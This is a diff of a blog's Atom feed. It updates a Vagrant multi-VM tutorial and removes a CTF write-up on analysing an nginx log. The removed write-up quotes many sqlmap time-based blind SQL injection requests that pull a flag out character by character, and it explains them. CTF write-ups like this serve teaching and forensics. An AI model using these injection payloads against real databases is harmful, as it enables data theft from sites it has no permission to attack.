-&lt;span class="no"&gt;Vagrant&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;configure&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;VAGRANTFILE_API_VERSION&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
-  &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;box&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ubuntu/trusty64&amp;quot;&lt;/span&gt;
-
-  &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;define&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;alice&amp;quot;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;alice&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
-    &lt;span class="n"&gt;alice&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hostname&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;alice&amp;quot;&lt;/span&gt;
-    &lt;span class="n"&gt;alice&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;network&lt;/span&gt; &lt;span class="ss"&gt;:private_network&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;192.168.33.210&amp;quot;&lt;/span&gt;
-    &lt;span class="n"&gt;alice&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;provision&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;shell&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;inline&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;echo 192.168.33.211 bob &amp;gt;&amp;gt; /etc/hosts&amp;quot;&lt;/span&gt;
-  &lt;span class="k"&gt;end&lt;/span&gt;
-
-  &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;define&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;bob&amp;quot;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;bob&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
-    &lt;span class="n"&gt;bob&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hostname&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;bob&amp;quot;&lt;/span&gt;
-    &lt;span class="n"&gt;bob&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;network&lt;/span&gt; &lt;span class="ss"&gt;:private_network&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;192.168.33.211&amp;quot;&lt;/span&gt;
-    &lt;span class="n"&gt;bob&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;provision&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;shell&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;inline&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;echo 192.168.33.210 alice &amp;gt;&amp;gt; /etc/hosts&amp;quot;&lt;/span&gt;
-  &lt;span class="k"&gt;end&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;define&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;bob&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;bob&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;bob&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hostname&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;bob&amp;quot;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;bob&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;network&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;:private_network&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;192.168.33.211&amp;quot;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;bob&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;provision&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;shell&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;inline&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;echo 192.168.33.210 alice &amp;gt;&amp;gt; /etc/hosts&amp;quot;&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;end&lt;/span&gt;
 &lt;span class="k"&gt;end&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-
-&lt;/figure&gt;
-
-&lt;p&gt;Here, we defined 2 VMs, &lt;code&gt;alice&lt;/code&gt; and &lt;code&gt;bob&lt;/code&gt;, that both have a sub-config setting their hostname and a private network IP and adding the other machine in the &lt;code&gt;hosts&lt;/code&gt; file.
-They also inherit from the top level config, so they will both use the box &lt;code&gt;ubuntu/trusty64&lt;/code&gt;.
-To define it per-machine, just make sure you use the per-machine variables (&lt;code&gt;alice&lt;/code&gt; and &lt;code&gt;bob&lt;/code&gt;) in their &lt;code&gt;do...end&lt;/code&gt; block.&lt;/p&gt;
+&lt;p&gt;Here, we defined 2 VMs, &lt;code&gt;alice&lt;/code&gt; and &lt;code&gt;bob&lt;/code&gt;, that both have a sub-config block configuring their hostname and a private network IP, as well as adding the other machine in their &lt;code&gt;/etc/hosts&lt;/code&gt; file.
+They also inherit from the top level config, so they will both use the box &lt;code&gt;kalilinux/rolling&lt;/code&gt;.
+To define it per-machine, simply use their per-machine variable: &lt;code&gt;alice.vm.box = "box/name"&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;The Vagrant command line differs when there is multiple machines defined.
 Commands that only make sense for a single machine, such as &lt;code&gt;vagrant ssh&lt;/code&gt;, require you to include the name of the machine as an argument: &lt;code&gt;vagrant ssh bob&lt;/code&gt;.
 Other commands, such as &lt;code&gt;vagrant up&lt;/code&gt;, will operate on every machine by default, but you can also specify the target: &lt;code&gt;vagrant up alice&lt;/code&gt;.&lt;/p&gt;
 &lt;h2 id="more-info"&gt;More info&lt;/h2&gt;
 &lt;p&gt;This post covered common usage of Vagrant, but you can do more with it, such as pushing code to Heroku or sharing your VM over SSH.
-The &lt;a href="https://docs.vagrantup.com"&gt;official documentation&lt;/a&gt; is very well structured, so make sure you have a look!&lt;/p&gt;</summary><category term="vagrant"></category></entry><entry><title>CTF writeup - RCTF 2015 Quals: Analysis nginx's log</title><link href="https://blog.jclariviere.com/posts/ctf-writeup-rctf-2015-quals-analysis-nginx-log" rel="alternate"></link><updated>2015-11-29T00:00:00-05:00</updated><author><name>Jean-Christophe Lariviere</name></author><id>tag:blog.jclariviere.com,2015-11-17:posts/ctf-writeup-rctf-2015-quals-analysis-nginx-log</id><summary type="html">&lt;h2 id="challenge"&gt;Challenge&lt;/h2&gt;
-&lt;blockquote&gt;
-&lt;p&gt;Analysis nginx's log (this flag is like ROIS{xxx}).&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;The log file can be found &lt;a href="https://github.com/ctfs/write-ups-2015/blob/master/rctf-quals-2015/misc/analysis-nginxs-log/log_d30afe96202aafae7c0a1ecc123c0584"&gt;here&lt;/a&gt;.&lt;/p&gt;
-&lt;h2 id="writeup"&gt;Writeup&lt;/h2&gt;
-&lt;p&gt;The first thing I did is to search for the string &lt;code&gt;flag&lt;/code&gt;, which found a &lt;a href="https://www.owasp.org/index.php/Blind_SQL_Injection"&gt;blind SQL Injection&lt;/a&gt; performed by &lt;a href="http://sqlmap.org/"&gt;sqlmap&lt;/a&gt;.
-I extracted those URL-encoded entries then converted them to readable text using &lt;a href="https://www.asciitohex.com"&gt;asciitohex&lt;/a&gt;, which gave lines like these:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;192.168.52.1 - - [06/Nov/2015:19:33:07 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),1,1))&amp;gt;64),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-192.168.52.1 - - [06/Nov/2015:19:33:07 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),1,1))&amp;gt;96),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-192.168.52.1 - - [06/Nov/2015:19:33:08 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),1,1))&amp;gt;80),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-192.168.52.1 - - [06/Nov/2015:19:33:08 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),1,1))&amp;gt;88),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-192.168.52.1 - - [06/Nov/2015:19:33:08 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),1,1))&amp;gt;84),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-192.168.52.1 - - [06/Nov/2015:19:33:08 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),1,1))&amp;gt;82),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-192.168.52.1 - - [06/Nov/2015:19:33:09 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),1,1))&amp;gt;81),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-&lt;span class="hll"&gt;192.168.52.1 - - [06/Nov/2015:19:33:09 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),1,1))!=82),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-&lt;/span&gt;192.168.52.1 - - [06/Nov/2015:19:33:10 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),2,1))&amp;gt;64),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-192.168.52.1 - - [06/Nov/2015:19:33:10 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),2,1))&amp;gt;96),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-192.168.52.1 - - [06/Nov/2015:19:33:10 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),2,1))&amp;gt;80),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-192.168.52.1 - - [06/Nov/2015:19:33:11 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),2,1))&amp;gt;72),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-192.168.52.1 - - [06/Nov/2015:19:33:12 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),2,1))&amp;gt;76),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-192.168.52.1 - - [06/Nov/2015:19:33:13 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),2,1))&amp;gt;78),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-192.168.52.1 - - [06/Nov/2015:19:33:13 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),2,1))&amp;gt;79),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-&lt;span class="hll"&gt;192.168.52.1 - - [06/Nov/2015:19:33:13 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),2,1))!=79),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-&lt;/span&gt;192.168.52.1 - - [06/Nov/2015:19:33:14 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),3,1))&amp;gt;64),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-192.168.52.1 - - [06/Nov/2015:19:33:14 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),3,1))&amp;gt;96),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-192.168.52.1 - - [06/Nov/2015:19:33:14 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),3,1))&amp;gt;80),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-192.168.52.1 - - [06/Nov/2015:19:33:15 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),3,1))&amp;gt;72),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-192.168.52.1 - - [06/Nov/2015:19:33:15 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),3,1))&amp;gt;76),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-192.168.52.1 - - [06/Nov/2015:19:33:15 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),3,1))&amp;gt;74),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-192.168.52.1 - - [06/Nov/2015:19:33:15 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),3,1))&amp;gt;73),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-&lt;span class="hll"&gt;192.168.52.1 - - [06/Nov/2015:19:33:15 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),3,1))!=73),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-&lt;/span&gt;192.168.52.1 - - [06/Nov/2015:19:33:16 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),4,1))&amp;gt;64),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-192.168.52.1 - - [06/Nov/2015:19:33:16 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),4,1))&amp;gt;96),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-192.168.52.1 - - [06/Nov/2015:19:33:17 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),4,1))&amp;gt;80),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-192.168.52.1 - - [06/Nov/2015:19:33:17 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),4,1))&amp;gt;88),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-192.168.52.1 - - [06/Nov/2015:19:33:17 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),4,1))&amp;gt;84),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-192.168.52.1 - - [06/Nov/2015:19:33:18 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),4,1))&amp;gt;82),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-192.168.52.1 - - [06/Nov/2015:19:33:18 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),4,1))&amp;gt;83),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-&lt;span class="hll"&gt;192.168.52.1 - - [06/Nov/2015:19:33:18 -0800] &amp;quot;GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),4,1))!=83),SLEEP(1),7500) HTTP/1.1&amp;quot; 200 5 &amp;quot;-&amp;quot; &amp;quot;sqlmap/1.0-dev (http://sqlmap.org)&amp;quot; &amp;quot;-&amp;quot;
-&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;For each character of the flag, there is a bunch of entries that basically does this:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;if flag[0].char_code &amp;gt; 64:
-    sleep(1)
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Then, after multiple guesses, sqlmap confirms the exact character code:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;if flag[0].char_code != 82:
-    sleep(1)
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Then it goes to the next character: &lt;code&gt;LIMIT 0,1),1,1&lt;/code&gt; becomes &lt;code&gt;LIMIT 0,1),2,1&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;So the most interesting entries contains a &lt;code&gt;!=&lt;/code&gt;, like this: &lt;code&gt;...LIMIT 0,1),1,1))!=82),SLEEP(1)...&lt;/code&gt; (highlighted in the snippet).
-We can find the flag value by extracting every character code after a &lt;code&gt;!=&lt;/code&gt;. I used Sublime Text's search + multi-select for this, but you can do some vim or regex magic too.
-Pasting these characters in &lt;a href="https://www.asciitohex.com"&gt;asciitohex&lt;/a&gt; revealed the flag.
-In the snippet above, you can find the first 4 characters.&lt;/p&gt;
-&lt;p&gt;Flag: &lt;code&gt;ROIS{miSc_An@lySis_nG1nx_L0g}&lt;/code&gt;.&lt;/p&gt;</summary><category term="ctf"></category><category term="sqli"></category></entry></feed>
+The &lt;a href="https://developer.hashicorp.com/vagrant/docs"&gt;official documentation&lt;/a&gt; is very well structured, so make sure you have a look!&lt;/p&gt;</content><category term="DevOps"></category><category term="vagrant"></category></entry></feed>
